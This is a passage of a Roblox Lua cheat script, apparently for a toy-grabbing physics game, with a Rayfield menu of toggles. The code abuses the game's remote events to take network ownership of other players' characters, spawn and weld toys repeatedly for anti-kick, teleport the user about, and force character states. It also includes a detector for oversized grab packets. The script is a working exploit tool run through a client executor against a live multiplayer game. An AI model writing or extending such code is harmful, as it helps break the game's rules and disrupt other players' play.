                                                if blobScript and rightDetector and leftDetector then
                                                    dropEvent = blobScript:FindFirstChild("CreatureDrop")
                                                    rightWeld = rightDetector:FindFirstChild("RightWeld")
                                                    leftWeld = leftDetector:FindFirstChild("LeftWeld")
                                                    
                                                    if dropEvent and rightWeld and hrp then
                                                        dropEvent:FireServer(rightWeld, hrp)
                                                    end
                                                    
                                                    if dropEvent and leftWeld and hrp then
                                                        dropEvent:FireServer(leftWeld, hrp)
                                                    end
                                                    
                                                    if replicatedStorage:FindFirstChild("CharacterEvents") then
                                                        struggleEvent = replicatedStorage.CharacterEvents:FindFirstChild("Struggle")
                                                        if struggleEvent then
                                                            struggleEvent:FireServer(player)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                            
                            kickFromBlob()
                        end
                    end
                end
            end
        end
        
        if not antiblob and player.Character then
            hrp = player.Character:FindFirstChild("HumanoidRootPart")
            truePosPart = player.Character:FindFirstChild("TruePositionPart")
            
            if hrp and truePosPart then
                rootAttachment = truePosPart:FindFirstChild("RootAttachment")
                if rootAttachment then
                    rootAttachment.Parent = hrp
                    print("what even happened here")
                end
                
                truePosPart:Destroy()
            end
        end
    end,
})

players = game:GetService("Players")
runService = game:GetService("RunService")
localPlayer = game.Players.LocalPlayer
workspace = game:GetService("Workspace")

antiBlobmanEnabled = false
antiBlobmanGrabEnabled = false
antiBlobmanConnection = nil

function getCharacter(player)
    char = player.Character
    if not char then
        if player.CharacterAdded then
            char = player.CharacterAdded:Wait() or nil
        else
            char = nil
        end
    end
    return char
end

function getHumanoidRootPart(character)
    return character:FindFirstChild("HumanoidRootPart") or nil
end

function getHumanoid(character)
    return character:FindFirstChild("Humanoid") or nil
end

function getDistance(part1, part2)
    return (part1.Position - part2.Position).Magnitude
end

function getAllToys(includePlots)
    allToys = {}
    playersList = players:GetPlayers()
    
    for _, player in ipairs(playersList) do
        toyFolder = workspace[player.Name .. "SpawnedInToys"]
        for _, toy in pairs(toyFolder:GetChildren()) do
            if toy:IsA("Model") then
                table.insert(allToys, toy)
            end
        end
    end
    
    if includePlots then
        for i = 1, 5 do
            for _, item in pairs(workspace.PlotItems["Plot" .. i]:GetChildren()) do
                if item:IsA("Model") then
                    table.insert(allToys, item)
                end
            end
        end
    end
    
    return allToys
end

function spawnToy(toyName, cframe)
    if localPlayer.CanSpawnToy then
        task.spawn(function()
            toySpawn = replicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
            toySpawn:InvokeServer(toyName, cframe * CFrame.new(0, 10, 20), Vector3.new(0, 0, 0))
            repeat
                task.wait()
            until myToysFolder:FindFirstChild(toyName)
            task.wait(0.01)
            return myToysFolder:FindFirstChild(toyName)
        end)
    end
end

function destroyToy(toy)
    task.spawn(function()
        success, err = pcall(function()
            toyDestroy = replicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
            toyDestroy:FireServer(toy)
        end)
        if not success then
            warn("Error: " .. err)
        end
    end)
end

function setNetworkOwner(part, cframe)
    task.spawn(function()
        setNetworkOwnerRemote = replicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
        setNetworkOwnerRemote:FireServer(part, cframe)
    end)
end

function toggleConstraint(constraint, enabled)
    if constraint then
        if constraint.Name ~= "LeftWeld" then
            if constraint.Name ~= "LeftAlignOrientation" then
                if constraint.Name ~= "RightWeld" then
                    if constraint.Name == "RightAlignOrientation" and (constraint and constraint.Parent.Parent.Parent ~= myToysFolder) then
                        constraint.Enabled = enabled
                    end
                elseif constraint and constraint.Parent.Parent.Parent ~= myToysFolder then
                    constraint.Enabled = enabled
                end
            elseif constraint and constraint.Parent.Parent.Parent ~= myToysFolder then
                constraint.Enabled = enabled
            end
        elseif constraint and constraint.Parent.Parent.Parent ~= myToysFolder then
            constraint.Enabled = enabled
        end
    end
end

function updateAntiBlobman()
    pcall(function()
        if antiBlobmanConnection then
            antiBlobmanConnection:Disconnect()
        end
    end)
    
    allToys = getAllToys(true)
    
    if antiBlobmanEnabled then
        for _, toy in pairs(allToys) do
            if toy.Name == "CreatureBlobman" then
                leftDetector = toy:FindFirstChild("LeftDetector")
                rightDetector = toy:FindFirstChild("RightDetector")
                leftWeld = leftDetector and leftDetector:FindFirstChild("LeftWeld")
                leftAlign = leftDetector and leftDetector:FindFirstChild("LeftAlignOrientation")
                rightWeld = rightDetector and rightDetector:FindFirstChild("RightWeld")
                rightAlign = rightDetector and rightDetector:FindFirstChild("RightAlignOrientation")
                
                toggleConstraint(leftWeld, false)
                toggleConstraint(leftAlign, false)
                toggleConstraint(rightWeld, false)
                toggleConstraint(rightAlign, false)
            end
        end
        
        antiBlobmanConnection = workspace.DescendantAdded:Connect(function(descendant)
            toggleConstraint(descendant, false)
        end)
    else
        for _, toy in pairs(allToys) do
            if toy.Name == "CreatureBlobman" then
                leftDetector = toy:FindFirstChild("LeftDetector")
                rightDetector = toy:FindFirstChild("RightDetector")
                leftWeld = leftDetector and leftDetector:FindFirstChild("LeftWeld")
                leftAlign = leftDetector and leftDetector:FindFirstChild("LeftAlignOrientation")
                rightWeld = rightDetector and rightDetector:FindFirstChild("RightWeld")
                rightAlign = rightDetector and rightDetector:FindFirstChild("RightAlignOrientation")
                
                toggleConstraint(leftWeld, true)
                toggleConstraint(leftAlign, true)
                toggleConstraint(rightWeld, true)
                toggleConstraint(rightAlign, true)
            end
        end
    end
end

function ragdollFall()
    rootPart = getHumanoidRootPart(getCharacter(localPlayer))
    if rootPart then
        ragdollRemote = replicatedStorage:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote")
        ragdollRemote:FireServer(rootPart, 1)
    end
end


AntiTab:CreateToggle({
    Name = "Anti blobman aura grab",
    Default = false,
    Color = Color3.fromRGB(102, 0, 102),
    Flag = "antiblobmanaura_toggle",
    Callback = function(enabled)
        antiBlobmanGrabEnabled = enabled
        while antiBlobmanGrabEnabled do
            for _, player in pairs(players:GetPlayers()) do
                if player and getCharacter(player) then
                    playerCharacter = getCharacter(player)
                    playerRootPart = nil
                    if playerCharacter then
                        playerRootPart = getHumanoidRootPart(playerCharacter)
                    end
                    playerHumanoid = nil
                    if playerCharacter then
                        playerHumanoid = getHumanoid(playerCharacter)
                    end
                    myCharacter = getCharacter(localPlayer)
                    myRootPart = nil
                    if myCharacter then
                        myRootPart = getHumanoidRootPart(myCharacter)
                    end
                    if player.Name ~= localPlayer.Name and (playerRootPart and (myRootPart and (playerHumanoid and (playerHumanoid.SeatPart and (playerHumanoid.SeatPart.Parent and (playerHumanoid.SeatPart.Parent.Name == "CreatureBlobman" and getDistance(playerRootPart, myRootPart) <= 19)))))) then
                        setNetworkOwner(playerRootPart, playerRootPart.CFrame)
                        task.wait(0.01)
                    end
                end
            end
            task.wait(0.01)
        end
    end
})

AntiTab:CreateSection("Anti lag")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ExtendGrabLine = ReplicatedStorage
    :WaitForChild("GrabEvents")
    :WaitForChild("ExtendGrabLine")


local KB_THRESHOLD = 5
local BYTE_THRESHOLD = KB_THRESHOLD * 1024
local COOLDOWN = 30
local lastNotify = 0

local connection = nil

local function notify(text)
    Rayfield:Notify({
        Title = "Sussy packet detected",
        Content = text,
        Duration = 7,
        Image = 4483362458
    })
end


local function resolveSender(args)
    for _, v in ipairs(args) do
        if typeof(v) == "Instance" and v:IsA("Player") then
            return v
        end
        if typeof(v) == "Instance" and v:IsA("Model") then
            local plr = Players:GetPlayerFromCharacter(v)
            if plr then return plr end
        end
        if typeof(v) == "Instance" and v:IsA("BasePart") then
            local model = v:FindFirstAncestorOfClass("Model")
            if model then
                local plr = Players:GetPlayerFromCharacter(model)
                if plr then return plr end
            end
        end
        if typeof(v) == "Instance" and v:IsA("Tool") then
            local model = v:FindFirstAncestorOfClass("Model")
            if model then
                local plr = Players:GetPlayerFromCharacter(model)
                if plr then return plr end
            end
        end
    end

    return LocalPlayer
end


local function shortenString(str)
    if #str <= 80 then
        return str
    end
    return str:sub(1, 80) .. "... (+" .. (#str - 80) .. " chars)"
end

local function summarizeTable(tbl)
    local preview = {}
    local count = 0
    for _, v in pairs(tbl) do
        count += 1
        if count <= 5 then
            table.insert(preview, tostring(v))
        end
    end
    return "table["..count.."] { "..table.concat(preview, ", ").." ... }"
end

local function compressArgs(args)
    local seen = {}
    local summary = {}

    for _, v in ipairs(args) do
        local key

        if typeof(v) == "string" then
            key = "str:"..shortenString(v)
        elseif typeof(v) == "Instance" then
            key = "inst:"..v.ClassName.."("..v.Name..")"
        elseif typeof(v) == "table" then
            key = "tbl:"..summarizeTable(v)
        else
            key = typeof(v)..":"..tostring(v)
        end

        seen[key] = (seen[key] or 0) + 1
    end

    for k, count in pairs(seen) do
        if count > 1 then
            table.insert(summary, k.." x"..count)
        else
            table.insert(summary, k)
        end
    end

    return summary
end


local function startDetector()
    if connection then return end

    connection = ExtendGrabLine.OnClientEvent:Connect(function(...)
        local args = { ... }

        local totalBytes = 0
        for _, v in ipairs(args) do
            if typeof(v) == "string" then
                totalBytes += #v
            end
        end

        if totalBytes < BYTE_THRESHOLD then return end
        if tick() - lastNotify < COOLDOWN then return end
        lastNotify = tick()

        local sender = resolveSender(args)
        local senderName = sender.DisplayName 
        local mbSize = totalBytes / (1024 * 1024)
        local summarized = compressArgs(args)


        notify(string.format(
            "Sender: %s\nSize: %.3f MB\nArgs:\n%s",
            senderName,
            mbSize,
            table.concat(summarized, "\n")
        ))
    end)
end

local function stopDetector()
    if connection then
        connection:Disconnect()
        connection = nil
    end
end


AntiTab:CreateToggle({
    Name = "Detect packets",
    CurrentValue = false,
    Flag = "GrabRemoteDetector",
    Callback = function(Value)
        if Value then
            startDetector()
            Rayfield:Notify({
                Title = "Enabled",
                Content = "WHY AM I LAGGING",
                Duration = 5
            })
        else
            stopDetector()
            Rayfield:Notify({
                Title = "Disabled",
                Content = "ok",
                Duration = 5
            })
        end
    end
})


antilaggg = false
antilagggauto = false

AntiTab:CreateToggle({
    Name = "Anti Lag",
    CurrentValue = false,
    Flag = "AntiLag",
    Callback = function(p1191)
        antilaggg = p1191
        game:GetService("Players").LocalPlayer.PlayerScripts.CharacterAndBeamMove.Disabled = p1191
    end
})

AntiTab:CreateToggle({
    Name = "Auto anti lag",
    CurrentValue = false,
    Flag = "AntiLag(Auto)",
    Callback = function(p1193)
        antilagggauto = p1193
    end
})

grabpersec = 0


GrabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
GrabRemote = GrabEvents and GrabEvents:FindFirstChild("Grab")
DestroyGrabLineRemote = GrabEvents and GrabEvents:FindFirstChild("DestroyGrabLine")
SetNetworkOwnerRemote = GrabEvents and GrabEvents:FindFirstChild("SetNetworkOwner")
SpawnToyRemote = GrabEvents and GrabEvents:FindFirstChild("SpawnToy")
DestroyToyRemote = GrabEvents and GrabEvents:FindFirstChild("DestroyToy")
RagdollRemote = ReplicatedStorage:FindFirstChild("CharacterEvents") and ReplicatedStorage.CharacterEvents:FindFirstChild("Ragdoll")
StruggleRemote = ReplicatedStorage:FindFirstChild("CharacterEvents") and ReplicatedStorage.CharacterEvents:FindFirstChild("Struggle")

game:GetService("Workspace").DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Model") and descendant.Name == "GrabParts" then
        grabpersec = grabpersec + 1
    end
    
    if grabpersec <= 25 or (not antilagggauto or antilaggg) then
        task.delay(1, function()
            if grabpersec ~= 0 then
                grabpersec = grabpersec - 1
            end
        end)
    else
        grabpersec = 0
        game:GetService("Players").LocalPlayer.PlayerScripts.CharacterAndBeamMove.Disabled = true
        print("Anti Lag is Enabled")
        
        if antilagggauto then
            originalBeamState = game:GetService("Players").LocalPlayer.PlayerScripts.CharacterAndBeamMove.Disabled
            
            task.delay(60, function()
                if not antilaggg then
                    game:GetService("Players").LocalPlayer.PlayerScripts.CharacterAndBeamMove.Disabled = false
                    print("Anti Lag is Disabled")
                end
            end)
        end
    end
end)

function antiLagSpamCleanup()
    if antilaggg or antilagggauto then
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("Model") and part.Name == "GrabParts" then
                pcall(function()
                    if DestroyGrabLineRemote then
                        for i = 1, 5 do
                            DestroyGrabLineRemote:FireServer(part)
                        end
                    end
                end)
            end
        end
    end
end

if antilagggauto then
    while task.wait(10) do
        if antilagggauto then
            antiLagSpamCleanup()
        else
            break
        end
    end
end

AntiTab:CreateSection("Anti Kick's")

AntiKickToggle = AntiTab:CreateToggle({
    Name = "Anti Kick ",
    CurrentValue = false,
    Flag = "AntiKickToggle",
    Callback = function(Value)
        getgenv().AntiKickEnabled = Value
        
        if Value then
            task.spawn(function()
                local plr = game.Players.LocalPlayer
                local inv = workspace[plr.Name .. "SpawnedInToys"]
                local hrp

                local setOwner = game.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                local stickyEvent = game.ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
                local destroyrem = game.ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
                local canSpawn = plr:WaitForChild("CanSpawnToy")

                local function getHRP()
                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        return plr.Character.HumanoidRootPart
                    else
                        local character = plr.CharacterAdded:Wait()
                        return character:WaitForChild("HumanoidRootPart")
                    end
                end

                function CheckForHome()
                    local ToyFolder
                    if not workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then 
                        return false
                    end
                    for _, v in pairs(workspace.Plots:GetChildren()) do
                        for _, b in pairs(v.PlotSign.ThisPlotsOwners:GetChildren()) do
                            if b.Value == plr.Name then
                                ToyFolder = workspace.PlotItems[v.Name]
                            end
                        end
                    end
                    if ToyFolder then 
                        return true, ToyFolder
                    else 
                        return false
                    end
                end

                local function StickKunai(kunai)
                    if not kunai or not kunai:FindFirstChild("StickyPart") then
                        return
                    end

                    local currentHRP = getHRP()
                    
                    if kunai:FindFirstChild("SoundPart") then
                        if not kunai["SoundPart"]:FindFirstChild("PartOwner") or kunai["SoundPart"].PartOwner.Value ~= plr.Name then 
                            setOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
                        end
                    end
                    
                    stickyEvent:FireServer(
                        kunai.StickyPart, currentHRP:FindFirstChild("FirePlayerPart") or currentHRP:WaitForChild("FirePlayerPart"), CFrame.new(0, 0, 0) * CFrame.Angles(0, math.rad(90), math.rad(90)))
                    
                    for _, obj in pairs(kunai:GetChildren()) do
                        if obj.Name == "Pyramid" then
                            obj.CanTouch = false
                            obj.CanCollide = false
                            obj.CanQuery = false
                            obj.Transparency = 0
                            local high = Instance.new("Highlight")
                            high.FillColor = Color3.fromRGB(0, 0, 0)
                            high.Parent = obj

                        elseif obj.Name == "Main" then
                            obj.CanTouch = false
                            obj.CanCollide = false
                            obj.CanQuery = false
                            obj.Transparency = 0
                            local high = Instance.new("Highlight")
                            high.FillColor = Color3.fromRGB(255, 255, 255)
                            high.Parent = obj

                        elseif obj:IsA("BasePart") then
                            obj.CanTouch = false
                            obj.CanCollide = false
                            obj.CanQuery = false
                            obj.Transparency = 1
                        end
                    end
                end

                local function ClearKunai()
                    for _, v in pairs(inv:GetChildren()) do
                        if v.Name == "AntiKick" then
                            destroyrem:FireServer(v)
                        end
                    end
                end

                local function SpawnToy(name)
                    while not canSpawn.Value do
                        canSpawn.Changed:Wait()
                    end

                    local currentHRP = getHRP()
                    
                    task.spawn(function()
                        game.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                            name, currentHRP.CFrame * CFrame.new(0, 12, 20), Vector3.new(0, 0, 0))
                    end)
                    
                    local boolik, house = CheckForHome()
                    if boolik then 
                        return house:WaitForChild(name, 2)
                    elseif not workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then 
                        return inv:WaitForChild(name, 2)
                    elseif workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) and not boolik then 
                        return nil
                    end
                end

                while getgenv().AntiKickEnabled do 
                    task.wait(0.005)

                    if not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health <= 0 then 
                        continue 
                    end
                    
                    local kunai = inv:FindFirstChild("NinjaShuriken")
                    
                    if workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then 
                        local boolik, house = CheckForHome()
                        if boolik and house and workspace.Plots:FindFirstChild(house.Name) and workspace.Plots:FindFirstChild(house.Name)["PlotSign"]["ThisPlotsOwners"]:FindFirstChild("Value") and workspace.Plots:FindFirstChild(house.Name)["PlotSign"]["ThisPlotsOwners"]["Value"]["TimeRemainingNum"].Value > 89 then 
                            kunai = SpawnToy("NinjaShuriken")
                            if kunai == nil then
                                continue
                            end
                            kunai.Name = "AntiKick" 
                            StickKunai(kunai)
                        end
                    end
                    
                    if not kunai then
                        if workspace.PlotItems.PlayersInPlots:FindFirstChild(plr.Name) then
                            continue
                        end 
                        kunai = SpawnToy("NinjaShuriken")
                        if kunai == nil then
                            continue
                        end 
                        kunai.Name = "AntiKick"
                        if not kunai then
                            continue
                        end 
                    end
                    
                    repeat
                        if kunai and kunai:FindFirstChild("StickyPart") and kunai.StickyPart.CanTouch == true then
                            StickKunai(kunai)
                            kunai.Name = "AntiKick"
                        end
                        wait(0.3)
                    until not kunai or not getgenv().AntiKickEnabled or not kunai:FindFirstChild("StickyPart") or kunai.StickyPart.CanTouch == false or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or not kunai:FindFirstChild("StickyPart") or (plr.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20

                    if not kunai or not kunai:FindFirstChild("StickyPart") or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or (plr.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then 
                        ClearKunai()
                    end 
                    
                    pcall(function()
                        repeat
                            wait(0.05)
                        until not getgenv().AntiKickEnabled or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or not kunai or not kunai:FindFirstChild("StickyPart") or not kunai.StickyPart:FindFirstChild("StickyWeld") or not kunai.StickyPart.StickyWeld.Part1
                        
                        if not kunai or not kunai:FindFirstChild("StickyPart") or (plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health <= 0) or not kunai["StickyPart"]:FindFirstChild("StickyWeld").Part1 then 
                            ClearKunai()
                        end
                    end)
                end
            end)
        end
    end,
})

COCK = false

Penis = AntiTab:CreateToggle({
    Name = "Pencil Anti-Kick",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        COCK = Value
        while COCK do
            while not game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys"):FindFirstChild("ToolPencil") do
                if game.Players.LocalPlayer.Character then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        game.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("ToolPencil", CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15), Vector3.new(0, 0, 0))
                    end
                end
                task.wait()
            end
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Torso") and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys"):FindFirstChild("ToolPencil") then
                    if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil:FindFirstChild("StickyPart") then
                        if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.StickyPart:FindFirstChild("StickyWeld") then
                            if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.StickyPart.StickyWeld.Part1 ~= game.Players.LocalPlayer.Character.Torso then
                                local a = game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.SoundPart.CFrame.Position
                                local b = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position
                                local distance = Vector3.new((a.X - b.X) ^ 2, (a.Y - b.Y) ^ 2, (a.Z - b.Z) ^ 2)
                                if math.sqrt(distance.X + distance.Y + distance.Z) > 20 then
                                    game.ReplicatedStorage.MenuToys.DestroyToy:FireServer(game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil)
                                else
                                    game.ReplicatedStorage.PlayerEvents.StickyPartEvent:FireServer(game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.StickyPart, game.Players.LocalPlayer.Character.Torso, CFrame.new(0, - 1, 0) * CFrame.Angles(0, math.pi, 0))
                                    for _, prt in pairs(game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil:GetChildren()) do
                                        if prt.ClassName == "Part" then
                                            prt.CanQuery = false
                                        end
                                    end
                                    task.wait(0.2)
                                    if game.Players.LocalPlayer.Character then
                                        if game.Players.LocalPlayer.Character:FindFirstChild("Torso") and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys"):FindFirstChild("ToolPencil") then
                                            if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil:FindFirstChild("StickyPart") then
                                                if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.StickyPart:FindFirstChild("StickyWeld") then
                                                    if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.StickyPart.StickyWeld.Part1 ~= game.Players.LocalPlayer.Character.Torso then
                                                        if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil then
                                                            if game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.StickyPart.StickyWeld.Part1 ~= game.Players.LocalPlayer.Character.Torso then
                                                                game.ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.SoundPart, game.workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys").ToolPencil.SoundPart.CFrame)
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait()
        end
    end,
})



AntiTab:CreateSection("Anti grab")

antiTpActive = false
local tpThreshold = 10
local lastPosition
local INSTANT_CFRAME
function safeNotify(args)
    pcall(function()
        Rayfield:Notify(args)
    end)
end
function getPlotInfo(plot)
    local sign = plot:FindFirstChild("PlotSign")
    local ownersFolder = sign and sign:FindFirstChild("ThisPlotsOwners")
    local valueObj = ownersFolder and ownersFolder:FindFirstChild("Value")
    local grabPart = plot:FindFirstChild("PlusGrabPart", true)
    return valueObj, grabPart
end
function ultraFastClaimPlot()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not (char and root) then
        return false
    end

    local plots = Workspace:FindFirstChild("Plots")
    if not plots then
        return false
    end

    for i = 1, 10 do
        local p = plots:FindFirstChild("Plot" .. i)
        if p then
            local owner, grab = getPlotInfo(p)
            if owner and owner.Value == LocalPlayer.Name and grab then
                root.CFrame = grab.CFrame
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                return true
            end
        end
    end

    for i = 1, 10 do
        local p = plots:FindFirstChild("Plot" .. i)
        if p then
            local owner, grab = getPlotInfo(p)
            if (not owner or owner.Value == "") and grab then
                root.CFrame = grab.CFrame
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero

                task.defer(function()
                    local tries = 0
                    repeat
                        tries += 1
                        pcall(function()
                            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(grab, grab.CFrame)
                        end)
                        task.wait(0.001)
                        owner = select(1, getPlotInfo(p))
                    until (owner and owner.Value == LocalPlayer.Name) or tries >= 5
                end)
                return true
            end
        end
    end
    return false
end
function ULTRA_INSTANT_TELEPORT(root)
    if INSTANT_CFRAME then
        root.CFrame = INSTANT_CFRAME
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
        return true
    end
    return ultraFastClaimPlot()
end

AntiTab:CreateToggle({
    Name = "Tp to house if getting loopkill",
    CurrentValue = false,
    Callback = function(Value)
        antiTpActive = Value
        if Value then
            task.spawn(function()
                local lastPos = nil
                local isHandling = false
                while antiTpActive do
                    if not isHandling then
                        local char = LocalPlayer.Character
                        local root = char and char:FindFirstChild("HumanoidRootPart")
                        if root then
                            local currentPos = root.Position
                            if lastPos then
                                local distance = (currentPos - lastPos).Magnitude
                                if distance > tpThreshold then
                                    isHandling = true
                                    ULTRA_INSTANT_TELEPORT(root)
                                    task.wait(0.05)
                                    isHandling = false
                                end
                            end
                            lastPos = root.Position
                        else
                            lastPos = nil
                        end
                    end
                    task.wait(0)
                end
            end)
        else
        end
    end
})

AntiTab:CreateSlider({
    Name = "Sensibility",
    Range = {
        1,
        1000
    },
    Increment = 5,
    CurrentValue = tpThreshold,
    Callback = function(Value)
        tpThreshold = Value
    end
})

AntiTab:CreateToggle({
    Name = "Anti Loop",
    CurrentValue = false,
    Flag = "AntiLoopToggle",
    Callback = function(Value)
        if Value then

            getgenv().teleportLocations = {
                Vector3.new(518.52, 834.62, - 362.38),
                Vector3.new(566.16, 124.33, - 93.13),
                Vector3.new(80.63, 346.19, 338.40),
                Vector3.new(288.70, 447.54, 481.17),
                Vector3.new(- 331.23, 81.64, 340.15),
                Vector3.new(- 566.02, - 6.35, 84.20),
                Vector3.new(- 514.05, - 6.35, - 160.63),
                Vector3.new(- 215.14, 60.76, - 304.82),
                Vector3.new(- 338.28, 22.11, 484.03)
            }
            
            getgenv().ultraFastLoopTP = function()
                while getgenv().AntiLoopEnabled do
                    local char = player.Character or player.CharacterAdded:Wait()
                    local hrp = char:WaitForChild("HumanoidRootPart")
                    
                    for _, location in ipairs(getgenv().teleportLocations) do
                        if hrp and getgenv().AntiLoopEnabled then
                            hrp.CFrame = CFrame.new(location)
                        end
                        task.wait(0.08)
                    end
                end
            end
            
            getgenv().AntiLoopEnabled = true
            task.spawn(getgenv().ultraFastLoopTP)
            player.CharacterAdded:Connect(function()
                task.wait(0.08)
                if getgenv().AntiLoopEnabled then
                    task.spawn(getgenv().ultraFastLoopTP)
                end
            end)
        else
            getgenv().AntiLoopEnabled = false
        end
    end
})

local Players = game:GetService("Players")

local Remotes = {}
for _, Remote in ReplicatedStorage:GetDescendants() do
    if Remote.ClassName:find("Remote") then
        Remotes[Remote.Name] = Remote
    end
end

local LocalPlayer = Players.LocalPlayer
local IsHeld = LocalPlayer:WaitForChild("IsHeld")

local Character = nil
local Root = nil
local Humanoid = nil
local Head = nil

local AntiGrabEnabled = false
local HeldConnection = nil
local SitThread = nil

----------------------------------------------------
-- Character Handling
----------------------------------------------------

local function GetLimbs(Char)
    if not Char then return {} end
    local Limbs = {}
    for _, Name in pairs({"Right Arm", "Left Arm", "Right Leg", "Left Leg"}) do
        Limbs[Name] = Char:FindFirstChild(Name)
    end
    return Limbs
end

local function GetRagdollLimbs(Char)
    if not Char then return {} end
    local RagdollLimbs = {}
    for _, Limb in pairs(GetLimbs(Char)) do
        if Limb then
            local RagdollLimb = Limb:FindFirstChild("RagdollLimbPart")
            if RagdollLimb then
                local Socket = RagdollLimb:FindFirstChildWhichIsA("BallSocketConstraint")
                if Socket then
                    RagdollLimbs[RagdollLimb] = Socket
                end
            end
        end
    end
    return RagdollLimbs
end

local function UpdateCharacter(NewCharacterModel)
    if not (NewCharacterModel and NewCharacterModel:IsDescendantOf(workspace)) then return end

    Character = NewCharacterModel
    Root = NewCharacterModel:WaitForChild("HumanoidRootPart", 5)
    Humanoid = NewCharacterModel:WaitForChild("Humanoid", 5)
    Head = NewCharacterModel:WaitForChild("Head", 5)
end

UpdateCharacter(LocalPlayer.Character)
LocalPlayer.CharacterAdded:Connect(UpdateCharacter)

----------------------------------------------------
-- SIT SYSTEM (NEW)
----------------------------------------------------

local function ForceSit()
    if SitThread then
        task.cancel(SitThread)
        SitThread = nil
    end

    SitThread = task.spawn(function()
        while AntiGrabEnabled and IsHeld.Value do
            pcall(function()
                if Humanoid and Root then
                    Humanoid.Sit = true
                    Humanoid:ChangeState(Enum.HumanoidStateType.Seated)

                    -- disable auto stand states
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, false)
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, false)
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)

                    -- kill velocities
                    Root.AssemblyLinearVelocity = Vector3.zero
                    Root.AssemblyAngularVelocity = Vector3.zero
                end
            end)
            task.wait(0.1)
        end

        -- restore after release
        if Humanoid then
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
            Humanoid.Sit = false
        end
    end)
end

----------------------------------------------------
-- ANTIGRAB
----------------------------------------------------

local function StartAntiGrab()

    if HeldConnection then
        HeldConnection:Disconnect()
        HeldConnection = nil
    end

    HeldConnection = IsHeld:GetPropertyChangedSignal("Value"):Connect(function()
        if not AntiGrabEnabled or not IsHeld.Value then return end

        -- NEW (important)
